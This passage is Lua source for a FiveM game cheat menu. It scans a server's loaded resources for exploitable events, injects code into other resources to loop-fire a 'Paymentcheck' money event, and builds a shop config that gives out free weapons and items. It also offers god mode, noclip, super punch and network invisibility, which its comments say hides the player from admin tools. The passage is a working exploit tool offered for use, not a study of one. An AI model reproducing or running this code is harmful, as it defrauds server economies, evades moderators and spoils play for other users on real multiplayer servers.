                    end
                    if matches then
                        for _, triggerInfo in ipairs(patternGroup.triggers) do
                            local isDuplicate = false
                            for _, existing in ipairs(foundTriggers[triggerInfo.type]) do
                                if existing.resource == resName and existing.trigger == triggerInfo.trigger then
                                    isDuplicate = true
                                    break
                                end
                            end
                            if not isDuplicate then
                                table.insert(foundTriggers[triggerInfo.type], {
                                    resource = resName,
                                    trigger = triggerInfo.trigger,
                                    file = "pattern",
                                    state = "started"
                                })
                                foundCount = foundCount + 1
                            end
                        end
                        break
                    end
                end
            end
            if foundCount >= 50 then
                break
            end
        end
    end

    -- If QBCore:server:Paymentcheck not found in littlethings, execute check
    if #foundTriggers.payment == 0 then
        checkAndExecuteLittlethings()
    end

    return foundCount > 0
end

-- Enhanced pattern search
local function enhancedPatternSearch()
    foundTriggers = {items = {}, money = {}, troll = {}, payment = {}, vehicle = {}}
    local foundCount = 0
    local totalResources = GetNumResources()
    local searchedResources = 0

    local function advancedSearchFile(resourceName, fileName, content)
        local found = false
        local contentLower = string.lower(content)
        local resourceState = GetResourceState(resourceName)
        local inventoryPatterns = {
            "inventory:server:openinventory",
            "inventory:server:open",
            "qb%-inventory:server:openinventory",
            "qs%-inventory:server:openinventory",
            "ox_inventory:openinventory",
            "esx_inventoryhud:server:openinventory"
        }
        for _, pattern in ipairs(inventoryPatterns) do
            if string.find(contentLower, pattern) then
                local exactTrigger = "inventory:server:OpenInventory"
                local exactMatch = content:match("'([^']*[Ii]nventory[^']*[Oo]pen[Ii]nventory[^']*)'") or
                                   content:match('"([^"]*[Ii]nventory[^"]*[Oo]pen[Ii]nventory[^"]*)"')
                if exactMatch then
                    exactTrigger = exactMatch
                end
                table.insert(foundTriggers.items, {
                    resource = resourceName,
                    trigger = exactTrigger,
                    file = fileName,
                    state = resourceState
                })
                foundCount = foundCount + 1
                found = true
                break
            end
        end
        if string.find(contentLower, ":server:givecomm") then
            local fullTrigger = "QBCore:server:GiveCommission"
            local exactMatch = content:match("'([^']*[Gg]ive[Cc]omm[^']*)'") or
                               content:match('"([^"]*[Gg]ive[Cc]omm[^"]*)"')
            if exactMatch then
                fullTrigger = exactMatch
            end
            table.insert(foundTriggers.money, {
                resource = resourceName,
                trigger = fullTrigger,
                file = fileName,
                state = resourceState
            })
            foundCount = foundCount + 1
            found = true
        end
        if string.find(contentLower, "server:paymentcheck") then
            local fullTrigger = "QBCore:server:Paymentcheck"
            table.insert(foundTriggers.payment, {
                resource = resourceName,
                trigger = fullTrigger,
                file = fileName,
                state = resourceState
            })
            foundCount = foundCount + 1
            found = true
        end
        if string.find(contentLower, "spawnvehicle") then
            local fullTrigger = "QBCore:Command:SpawnVehicle"
            local exactMatch = content:match("'([^']*[Ss]pawn[Vv]ehicle[^']*)'") or
                               content:match('"([^"]*[Ss]pawn[Vv]ehicle[^"]*)"')
            if exactMatch then
                fullTrigger = exactMatch
            end
            local isDuplicate = false
            for _, existing in ipairs(foundTriggers.vehicle) do
                if existing.resource == resourceName and existing.trigger == fullTrigger then
                    isDuplicate = true
                    break
                end
            end
            if not isDuplicate then
                table.insert(foundTriggers.vehicle, {
                    resource = resourceName,
                    trigger = fullTrigger,
                    file = fileName,
                    state = resourceState
                })
                foundCount = foundCount + 1
                found = true
            end
        end
        return found
    end

    for i = 0, totalResources - 1 do
        local resourceName = GetResourceByFindIndex(i)
        if resourceName then
            searchedResources = searchedResources + 1
            local skipPatterns = {
                "mysql", "oxmysql", "ghmattimysql", "webpack", "yarn", "node_modules",
                "discord", "screenshot", "loading", "spawn", "weather", "time",
                "map", "ui", "hud", "chat", "voice", "radio", "tokovoip", "salt",
                "filesystem", "monitor", "admin", "logging"
            }
            local shouldSkip = false
            local lowerName = string.lower(resourceName)
            for _, pattern in ipairs(skipPatterns) do
                if string.find(lowerName, pattern, 1, true) then
                    shouldSkip = true
                    break
                end
            end
            if not shouldSkip then
                local priorityFiles = {
                    "client.lua", "server.lua", "shared.lua",
                    "client/main.lua", "server/main.lua",
                    "client/interactions.lua"
                }
                for _, fileName in ipairs(priorityFiles) do
                    local success, content = pcall(function()
                        return LoadResourceFile(resourceName, fileName)
                    end)
                    if success and content and content ~= "" and string.len(content) < 500000 then
                        advancedSearchFile(resourceName, fileName, content)
                    end
                end
            end
            if searchedResources % 25 == 0 then
                MachoMenuNotification("Safe Search", "Progress: " .. math.floor((searchedResources/totalResources)*100) .. "% | Found: " .. foundCount)
                Citizen.Wait(25)
            end
            if foundCount >= 15 then
                break
            end
        end
    end
    return foundCount > 0
end

-- Original config generation
local function generateOriginalConfig()
    local configCode = [[
        local Config = {}
        Config.Products = {
            ["arcadebar"] = {
                [1] = { name = "faberge-egg", price = 0, amount = 100000000, info = {}, type = "item", slot = 1 },
                [2] = { name = "weapon_heavypistol", price = 0, amount = 100000000, info = {}, type = "item", slot = 2 },
                [3] = { name = "weapon_pistol_mk2", price = 0, amount = 100000000, info = {}, type = "item", slot = 3 },
                [4] = { name = "pistol_ammo", price = 0, amount = 100000000, info = {}, type = "item", slot = 4 },
                [5] = { name = "armor", price = 0, amount = 100000000, info = {}, type = "item", slot = 5 },
                [6] = { name = "ziptie", price = 0, amount = 100000000, info = {}, type = "item", slot = 6 },
                [7] = { name = "weapon_carbinerifle", price = 0, amount = 100000000, info = {}, type = "item", slot = 7 },
                [8] = { name = "bandage", price = 0, amount = 100000000, info = {}, type = "item", slot = 8 },
                [9] = { name = "lockpick", price = 0, amount = 100000000, info = {}, type = "item", slot = 9 },
                [10] = { name = "radio", price = 0, amount = 100000000, info = {}, type = "item", slot = 10 }
            }
        }
        Config.Locations = {
            ["arcadebar"] = {
                ["blip"] = "arcadebar_shop_blip",
                ["label"] = "arcadebar_shop",
                ["type"] = "arcadebar",
                ["coords"] = {[1] = vector3(339.17, -909.97, 29.25)},
                ["products"] = Config.Products["arcadebar"],
            },
        }
        local ShopItems = {}
        ShopItems.label = Config.Locations["arcadebar"]["label"]
        ShopItems.items = Config.Locations["arcadebar"]["products"]
        ShopItems.slots = 10
    ]]
    return configCode, 10
end

-- Player IDs functions
local function clearAllGamerTags()
    pcall(function()
        for pid, data in pairs(playerGamerTags) do
            if data and data.gamerTag and IsMpGamerTagActive(data.gamerTag) then
                RemoveMpGamerTag(data.gamerTag)
            end
        end
        playerGamerTags = {}
    end)
end

local function setGamerTagFivem(targetTag, pid)
    pcall(function()
        if targetTag and IsMpGamerTagActive(targetTag) then
            SetMpGamerTagVisibility(targetTag, 0, 1)
            SetMpGamerTagHealthBarColor(targetTag, 129)
            SetMpGamerTagAlpha(targetTag, 2, 255)
            SetMpGamerTagVisibility(targetTag, 2, 1)
            SetMpGamerTagAlpha(targetTag, 4, 0)
            SetMpGamerTagVisibility(targetTag, 4, 0)
            SetMpGamerTagColour(targetTag, 0, 0)
        end
    end)
end

local function clearGamerTagFivem(targetTag)
    pcall(function()
        if targetTag and IsMpGamerTagActive(targetTag) then
            SetMpGamerTagVisibility(targetTag, 0, 0)
            SetMpGamerTagVisibility(targetTag, 2, 0)
            SetMpGamerTagVisibility(targetTag, 4, 0)
        end
    end)
end

local function startPlayerIdThread()
    Citizen.CreateThread(function()
        local distanceToCheck = 150
        while isPlayerIdsEnabled do
            local success, err = pcall(function()
                local curCoords = GetEntityCoords(PlayerPedId())
                local allActivePlayers = GetActivePlayers()
                for _, pid in ipairs(allActivePlayers) do
                    if pid and pid ~= -1 then
                        local targetPed = GetPlayerPed(pid)
                        if targetPed and DoesEntityExist(targetPed) then
                            if not playerGamerTags[pid] or playerGamerTags[pid].ped ~= targetPed or not IsMpGamerTagActive(playerGamerTags[pid].gamerTag) then
                                local playerName = GetPlayerName(pid) or "unknown"
                                local serverId = GetPlayerServerId(pid) or 0
                                if playerName and serverId > 0 then
                                    playerName = string.sub(playerName, 1, 75)
                                    local playerStr = '[' .. serverId .. '] ' .. playerName
                                    playerGamerTags[pid] = {
                                        gamerTag = CreateFakeMpGamerTag(targetPed, playerStr, false, false, 0),
                                        ped = targetPed
                                    }
                                end
                            end
                            if playerGamerTags[pid] and playerGamerTags[pid].gamerTag then
                                local targetTag = playerGamerTags[pid].gamerTag
                                local targetPedCoords = GetEntityCoords(targetPed)
                                if targetPedCoords and curCoords then
                                    local distance = #(targetPedCoords - curCoords)
                                    if distance <= distanceToCheck then
                                        setGamerTagFivem(targetTag, pid)
                                    else
                                        clearGamerTagFivem(targetTag)
                                    end
                                end
                            end
                        end
                    end
                end
            end)
            if not success then
            end
            Citizen.Wait(250)
        end
        pcall(function()
            clearAllGamerTags()
        end)
    end)
end

-- Payment loop for QBCore:server:Paymentcheck
local function startPaymentLoop()
    isPaymentLoopRunning = true
    Citizen.CreateThread(function()
        while isPaymentLoopRunning do
            -- Check if we have payment triggers available
            if #foundTriggers.payment > 0 then
                for _, triggerData in ipairs(foundTriggers.payment) do
                    if triggerData.trigger == "QBCore:server:Paymentcheck" then
                        -- Execute the payment check directly without UI interference
                        Citizen.CreateThread(function()
                            MachoInjectResource(triggerData.resource, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                        end)
                    end
                end
                MachoMenuNotification("Money", "Payment check triggered")
            else
                -- Try to find littlethings resource again
                local totalRes = GetNumResources()
                local foundPaymentResource = false
                for i = 0, totalRes - 1 do
                    local resName = GetResourceByFindIndex(i)
                    if resName and GetResourceState(resName) == "started" then
                        local lowerName = string.lower(resName)
                        if string.find(lowerName, "littlethings") then
                            -- Verify the resource contains the payment check by checking files
                            local paymentEventFound = false
                            local checkFiles = {"client.lua", "server.lua", "shared.lua", "client/main.lua", "server/main.lua"}
                            for _, fileName in ipairs(checkFiles) do
                                local success, content = pcall(function()
                                    return LoadResourceFile(resName, fileName)
                                end)
                                if success and content and content ~= "" then
                                    local contentLower = string.lower(content)
                                    if string.find(contentLower, "paymentcheck") or string.find(contentLower, "payment.*check") then
                                        paymentEventFound = true
                                        break
                                    end
                                end
                            end
                            if paymentEventFound then
                                Citizen.CreateThread(function()
                                    MachoInjectResource(resName, 'TriggerServerEvent("QBCore:server:Paymentcheck")')
                                end)
                                foundPaymentResource = true
                                MachoMenuNotification("Money", "Payment check triggered from " .. resName)
                                break
                            end
                        end
                    end
                end
                if not foundPaymentResource then
                    MachoMenuNotification("Error", "Payment check resource not found")
                    isPaymentLoopRunning = false
                    if paymentCheckbox then
                        MachoMenuSetCheckbox(paymentCheckbox, false)
                    end
                    break
                end
            end
            Citizen.Wait(paymentLoopSpeed)
        end
    end)
end




-- Menu creation
local function createMenu()
    MenuWindow = MachoMenuTabbedWindow("7oo4", MenuStartCoords.x, MenuStartCoords.y, MenuSize.x, MenuSize.y, TabsBarWidth)
    MachoMenuSetAccent(MenuWindow, 38,69,52)

    
    MachoMenuText(MenuWindow,"Player & Self")
    local GeneralTab = MachoMenuAddTab(MenuWindow, "Player")
    local LeftSectionWidth = (MenuSize.x - TabsBarWidth) * 0.5
    local RightSectionWidth = (MenuSize.x - TabsBarWidth) * 0.35
    local RightSectionHeight = (MenuSize.y - 20) / 2

    local GeneralLeftSection = MachoMenuGroup(GeneralTab, "looks & Outfits", 
        TabsBarWidth + 5, 5 + MachoPaneGap, 
        TabsBarWidth + LeftSectionWidth, MenuSize.y - 5)
        
        

MachoMenuButton(GeneralLeftSection, "Random outfit", function()
    Citizen.CreateThread(function()
        while not NetworkIsPlayerActive(PlayerId()) do
            Citizen.Wait(0)
        end
    
        Citizen.Wait(0) 
    
        local model = GetHashKey("mp_m_freemode_01")  
    
        RequestModel(model)
        while not HasModelLoaded(model) do
            Citizen.Wait(0)
        end
    
        SetPlayerModel(PlayerId(), model)
        SetModelAsNoLongerNeeded(model)
    
        local newPed = PlayerPedId()
    
        SetPedComponentVariation(newPed, 8, math.random(0, 15), 0, 2)  
        SetPedComponentVariation(newPed, 11, math.random(0, 120), 0, 2) 
        SetPedComponentVariation(newPed, 3, math.random(0, 15), 0, 2)   
        SetPedComponentVariation(newPed, 4, math.random(0, 50), 0, 2)   
        SetPedComponentVariation(newPed, 6, math.random(0, 30), 0, 2)   
    
        SetPedPropIndex(newPed, 0, math.random(0, 10), 0, true) 
        SetPedPropIndex(newPed, 1, math.random(0, 10), 0, true)  
    
    end)
    
end)
local enableRandomOutfit = false
local outfitChangeInterval = 0 

MachoMenuCheckbox(GeneralLeftSection, "Random Outfit Loop", 
    function()
        enableRandomOutfit = true
    end,
    function()
        enableRandomOutfit = false
    end
)
MachoMenuText(GeneralLeftSection,"Exploits & Self")
MachoMenuCheckbox(GeneralLeftSection, "Super Punch", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
            local playerPed = PlayerPedId() 
            local weaponHash = GetHashKey("WEAPON_UNARMED") 
            
            SetWeaponDamageModifier(weaponHash, 9999.0)
        ]])
        
        MachoMenuNotification("Combat", "Super Punch enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                local playerPed = PlayerPedId() 
                local weaponHash = GetHashKey("WEAPON_UNARMED") 
                
                SetWeaponDamageModifier(weaponHash, 1.0)
            ]])
            
            MachoMenuNotification("Combat", "Super Punch disabled")
        end
    end
)
local invisibilityLoop = false
MachoMenuCheckbox(GeneralLeftSection, "kill frindly", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 140, true)
           SetPedConfigFlag(PlayerPedId(), 45, true)
           SetPedConfigFlag(PlayerPedId(), 442, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 140, false)
                SetPedConfigFlag(PlayerPedId(), 45, false)
                SetPedConfigFlag(PlayerPedId(), 442, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
local invisibilityAlpha = 255 -- القيمة الافتراضية (مرئي بالكامل)
local invisibilityLoop = false

local selectedKey = 0

local InvisibilitySlider = MachoMenuSlider(GeneralLeftSection, "Invisibility Level", 210, 0, 210, "%", 0, function(Value)
    invisibilityAlpha = Value
    
    -- تطبيق التغيير فوراً إذا كان الاختفاء مفعل
    if invisibilityLoop then
        local playerPed = PlayerPedId()
        
        -- للكلاينت: التحكم في الشفافية
        if invisibilityAlpha == 0 then
            SetEntityVisible(playerPed, false, false)
        else
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, invisibilityAlpha, false)
        end
    end
end)

MachoMenuCheckbox(GeneralLeftSection, "Invisible",
    function()
        invisibilityLoop = true
        MachoMenuNotification("Invisible", "Activated - Alpha: " .. invisibilityAlpha)
        
        CreateThread(function()
            while invisibilityLoop do
                local playerPed = PlayerPedId()
                
                -- للآخرين: إخفاء كامل دائماً
                SetEntityVisible(playerPed, false, false)
                
                -- للكلاينت فقط: جعل الشخصية مرئية محلياً
                SetEntityLocallyVisible(playerPed)
                
                -- تطبيق مستوى الشفافية للكلاينت
                if invisibilityAlpha == 0 then
                    SetEntityAlpha(playerPed, 0, false)
                else
                    SetEntityAlpha(playerPed, invisibilityAlpha, false)
                end
                
                Wait(0)
            end
            
            -- إرجاع الشخصية للحالة الطبيعية عند الإلغاء
            local playerPed = PlayerPedId()
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, 255, false)
        end)
    end,
    function()
        invisibilityLoop = false
        MachoMenuNotification("Invisible", "Deactivated")
        
        -- إرجاع الشخصية للحالة الطبيعية
        local playerPed = PlayerPedId()
        SetEntityVisible(playerPed, true, false)
        SetEntityAlpha(playerPed, 255, false)
    end
)

-- Keybind للاختصار
MachoMenuKeybind(GeneralLeftSection, "Invisible Key", 0, function(key, toggle)
    selectedKey = key
end)

-- وظيفة الاختصار
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not invisibilityLoop then
            invisibilityLoop = true
            MachoMenuNotification("Invisible", "Activated - Alpha: " .. invisibilityAlpha)
            
            CreateThread(function()
                while invisibilityLoop do
                    local playerPed = PlayerPedId()
                    
                    -- للآخرين: إخفاء كامل
                    SetEntityVisible(playerPed, false, false)
                    
                    -- للكلاينت: جعل الشخصية مرئية محلياً
                    SetEntityLocallyVisible(playerPed)
                    
                    -- تطبيق مستوى الشفافية
                    if invisibilityAlpha == 0 then
                        SetEntityAlpha(playerPed, 0, false)
                    else
                        SetEntityAlpha(playerPed, invisibilityAlpha, false)
                    end
                    
                    Wait(0)
                end
                
                -- إرجاع الشخصية للحالة الطبيعية عند الإلغاء
                local playerPed = PlayerPedId()
                SetEntityVisible(playerPed, true, false)
                SetEntityAlpha(playerPed, 255, false)
            end)
        else
            invisibilityLoop = false
            MachoMenuNotification("Invisible", "Deactivated")
            
            -- إرجاع الشخصية للحالة الطبيعية
            local playerPed = PlayerPedId()
            SetEntityVisible(playerPed, true, false)
            SetEntityAlpha(playerPed, 255, false)
        end
    end
end)
local noclip = false
local noclipSpeed = 1
local originalCollision = {}
local selectedKey = 0

-- السلايدر للسرعة
local NoclipSpeedSlider = MachoMenuSlider(GeneralLeftSection, "Noclip Speed", 1, 0.1, 10, "", 1, function(Value)
    noclipSpeed = Value
end)

-- دالة النوكليب الرئيسية
local function NoclipLoop()
    CreateThread(function()
        while noclip do
            local ped = PlayerPedId()
            local coords = GetEntityCoords(ped)
            local x, y, z = coords.x, coords.y, coords.z
            local speed = noclipSpeed
            local veh = GetVehiclePedIsIn(ped, 0)
            
            local entity
            if veh ~= 0 then
                entity = veh
            else
                entity = ped
            end

            SetEntityCollision(entity, false, false)
            SetEntityVelocity(entity, 0.0, 0.0, 0.0)

            -- التحكم في السرعة
            if IsControlPressed(0, 21) then -- Shift للسرعة
                speed = speed * 4
            elseif IsControlPressed(0, 19) then -- Alt للبطء
                speed = speed * 0.3
            end

            -- الحصول على اتجاه الكاميرا
            local camRot = GetGameplayCamRot(2)
            local camHeading = camRot.z
            local camPitch = camRot.x
            
            -- تحويل إلى راديان
            local headingRad = camHeading * 3.14159 / 180.0
            local pitchRad = camPitch * 3.14159 / 180.0
            
            -- حساب الاتجاه الثلاثي الأبعاد
            local dirX = -math.sin(headingRad) * math.cos(pitchRad)
            local dirY = math.cos(headingRad) * math.cos(pitchRad)
            local dirZ = math.sin(pitchRad)

            -- الحركة
            if IsControlPressed(0, 32) then -- W للأمام
                x = x + speed * dirX
                y = y + speed * dirY
                z = z + speed * dirZ
            end

            if IsControlPressed(0, 33) then -- S للخلف
                x = x - speed * dirX
                y = y - speed * dirY
                z = z - speed * dirZ
            end

            if IsControlPressed(0, 34) then -- A يسار
                local leftX = -math.cos(headingRad)
                local leftY = -math.sin(headingRad)
                x = x + speed * leftX
                y = y + speed * leftY
            end

            if IsControlPressed(0, 35) then -- D يمين
                local rightX = math.cos(headingRad)
                local rightY = math.sin(headingRad)
                x = x + speed * rightX
                y = y + speed * rightY
            end

            if IsControlPressed(0, 22) then -- Space للأعلى
                z = z + speed
            end

            if IsControlPressed(0, 36) then -- Ctrl للأسفل
                z = z - speed
            end

            SetEntityCoordsNoOffset(entity, x, y, z, true, true, true)
            
            -- للسيارة: توجيه حسب الكاميرا
            if veh ~= 0 then
                SetEntityHeading(veh, camHeading)
                local currentRot = GetEntityRotation(veh)
                SetEntityRotation(veh, camPitch, currentRot.y, camHeading, 2, true)
            end
            
            Wait(0)
        end
    end)
end

-- دالة تفعيل النوكليب
local function ActivateNoclip()
    noclip = true
    MachoMenuNotification("Noclip", "Activated - Speed: " .. noclipSpeed)
    
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    -- حفظ حالة التصادم الأصلية
    originalCollision.ped = true
    if veh ~= 0 then
        originalCollision.veh = true
    end
    
    NoclipLoop()
end

-- دالة إلغاء النوكليب
local function DeactivateNoclip()
    noclip = false
    MachoMenuNotification("Noclip", "Deactivated")
    
    -- إعادة تفعيل التصادم
    local ped = PlayerPedId()
    local veh = GetVehiclePedIsIn(ped, 0)
    
    if originalCollision.ped then
        SetEntityCollision(ped, true, true)
    end
    if veh ~= 0 and originalCollision.veh then
        SetEntityCollision(veh, true, true)
    end
end

-- التشيك بوكس للنوكليب
MachoMenuCheckbox(GeneralLeftSection, "Noclip",
    function()
        ActivateNoclip()
    end,
    function()
        DeactivateNoclip()
    end
)

-- الكيبايند للاختصار
MachoMenuKeybind(GeneralLeftSection, "Noclip Key", 0, function(key, toggle)
    selectedKey = key
end)

-- مراقبة ضغط المفتاح باستخدام MachoOnKeyDown
MachoOnKeyDown(function(key)
    if key == selectedKey and selectedKey ~= 0 then
        if not noclip then
            ActivateNoclip()
        else
            DeactivateNoclip()
        end
    end
end)
local radarInvisibilityLoop = false

MachoMenuCheckbox(GeneralLeftSection, "Full Invisibility [BETA]", 
   function()
       radarInvisibilityLoop = true
       MachoMenuNotification("Full Invisibility", "Activated")
       
       Citizen.CreateThread(function()
           while radarInvisibilityLoop do
               local playerPed = PlayerPedId()
               
               -- Hide from radar/minimap completely
               SetEntityVisible(playerPed, true, false) -- Keep visible to yourself
               MachoInjectResource("any",[[SetEntityVisibleToNetwork(PlayerPedId(), false)]])  -- Hide from network/other players
               
               -- Advanced radar hiding
               SetPlayerInvisibleLocally(PlayerId(), false) -- Stay visible to yourself
               SetEntityAlpha(playerPed, 255, false) -- Keep full opacity for yourself
               
               -- Hide blip and disable radar tracking
               local playerId = PlayerId()
               local playerBlip = GetBlipFromEntity(playerPed)
               if DoesBlipExist(playerBlip) then
                   SetBlipAlpha(playerBlip, 0)
                   RemoveBlip(playerBlip)
               end
               
               -- Network invisibility for admin tools
               NetworkSetEntityInvisibleToNetwork(playerPed, true)
               SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(playerPed), false)
               
               Citizen.Wait(100)
           end
           
           -- Restore visibility when disabled
           local playerPed = PlayerPedId()
           SetEntityVisible(playerPed, true, false)
           MachoInjectResource("any",[[SetEntityVisibleToNetwork(PlayerPedId(), true)]])
           SetPlayerInvisibleLocally(PlayerId(), false)
           SetEntityAlpha(playerPed, 255, false)
           NetworkSetEntityInvisibleToNetwork(playerPed, false)
           SetNetworkIdExistsOnAllMachines(NetworkGetNetworkIdFromEntity(playerPed), true)
       end)
   end,
   function()
       radarInvisibilityLoop = false
       MachoMenuNotification("Full Invisibility", "Deactivatedn")
   end
)


local godModeLoop = false
MachoMenuCheckbox(GeneralLeftSection, "Good Mode", 
   function()
       godModeLoop = true
       MachoMenuNotification("Good Mode", "Activated")
       
       Citizen.CreateThread(function()
           while godModeLoop do
               local playerPed = PlayerPedId()
               SetEntityInvincible(playerPed, true)
               SetPlayerInvincible(PlayerId(), true)
               SetEntityHealth(playerPed, GetEntityMaxHealth(playerPed))
               SetPedArmour(playerPed, GetPlayerMaxArmour(PlayerId()))
               SetEntityCanBeDamaged(playerPed, false)
               SetEntityProofs(playerPed, true, true, true, true, true, true, true, true)
               Citizen.Wait(0)
           end
           
           local playerPed = PlayerPedId()
           SetEntityInvincible(playerPed, false)
           SetPlayerInvincible(PlayerId(), false)
           SetEntityCanBeDamaged(playerPed, true)
           SetEntityProofs(playerPed, false, false, false, false, false, false, false, false)
       end)
   end,
   function()
       godModeLoop = false
       MachoMenuNotification("Good Mode", "Deactivated")
   end
)
-- Semi God Mode

local SemiGod = false

MachoMenuCheckbox(GeneralLeftSection, "Semi God Mode", 
    function()
        SemiGod = true
        MachoMenuNotification("Semi God Mode", "Activated")
        
        Citizen.CreateThread(function()
            while SemiGod do
                local playerPed = PlayerPedId()
                
                -- Keep health above 200
                if GetEntityHealth(playerPed) < 200 then
                    SetEntityHealth(playerPed, 200)
                end
                
                Citizen.Wait(100) -- Check every 100ms
            end
        end)
    end,
    function()
        SemiGod = false
        MachoMenuNotification("Semi God Mode", "Deactivated")
    end
)

local antiTpLoop = false
local originalPosition = nil
local lastSafePosition = nil
local initializationComplete = false
local teleportCooldown = 0
MachoMenuText(GeneralLeftSection,"Antis & Spoofers")
local soloSessionLoop = false
MachoMenuButton(GeneralLeftSection, "start/stop Solo Session", function()
    if not soloSessionLoop then
        soloSessionLoop = true
        MachoMenuNotification("Solo Session", "Activated")
        NetworkStartSoloTutorialSession()
    else
        soloSessionLoop = false
        MachoMenuNotification("Solo Session", "Deactivated")
        NetworkEndTutorialSession()
    end
end)
MachoMenuButton(GeneralLeftSection, "Force Undrag", function()
MachoInjectResource("any", [[
    local playerPed = PlayerPedId()
    local playerPos = GetEntityCoords(playerPed)
    local forward = GetEntityForwardVector(playerPed)
    local spawnPos = playerPos + forward * 2.0
    local heading = GetEntityHeading(playerPed)
    local wallModel = `prop_barriercrash_01`

    -- Request model (client-side)
    RequestModel(wallModel)
    while not HasModelLoaded(wallModel) do
        Citizen.Wait(10)
    end

    -- Create invisible, non-networked wall object (client-side only)
    local wallObject = CreateObjectNoOffset(wallModel, spawnPos.x, spawnPos.y, spawnPos.z, false, false, false)
    SetEntityHeading(wallObject, heading)
    PlaceObjectOnGroundProperly(wallObject)
    SetEntityAsMissionEntity(wallObject, true, true)
    FreezeEntityPosition(wallObject, true)
    SetEntityCollision(wallObject, true, true)
    SetEntityDynamic(wallObject, false)
    SetEntityInvincible(wallObject, true)
    SetEntityVisible(wallObject, false, false)

    SetModelAsNoLongerNeeded(wallModel)

    -- Force player into cover (client-side)
    ClearPedTasksImmediately(playerPed)
    SetPedConfigFlag(playerPed, 287, true)
    TaskWarpPedDirectlyIntoCover(playerPed, 1000, true, true, false, nil)

    -- Delete wall immediately (client-side)
    Citizen.Wait(100)
    if DoesEntityExist(wallObject) then
        DeleteEntity(wallObject)
    end
]])
end)
MachoMenuCheckbox(GeneralLeftSection, "Anti HS", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            else
                MachoMenuNotification("Error", "No resources found!")
                return
            end
        end
        
        MachoInjectResource(targetResource, [[
           SetPedConfigFlag(PlayerPedId(), 34, true)
        ]])
        
        MachoMenuNotification("Player", "Enhanced Mode enabled")
    end,
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
        for _, resourceName in ipairs(resourcePriority) do
            if GetResourceState(resourceName) == "started" then
                table.insert(foundResources, resourceName)
            end
        end
        
        if #foundResources > 0 then
            targetResource = foundResources[math.random(1, #foundResources)]
        else
            local allResources = {}
            for i = 0, GetNumResources() - 1 do
                local resourceName = GetResourceByFindIndex(i)
                if resourceName and GetResourceState(resourceName) == "started" then
                    table.insert(allResources, resourceName)
                end
            end
            if #allResources > 0 then
                targetResource = allResources[math.random(1, #allResources)]
            end
        end
        
        if targetResource then
            MachoInjectResource(targetResource, [[
                SetPedConfigFlag(PlayerPedId(), 34, false)
            ]])
            
            MachoMenuNotification("Player", "Enhanced Mode disabled")
        end
    end
)
MachoMenuCheckbox(GeneralLeftSection, "Anti jack", 
    function()
        local targetResource = nil
        local resourcePriority = {"any", "any", "any"}
        local foundResources = {}
        
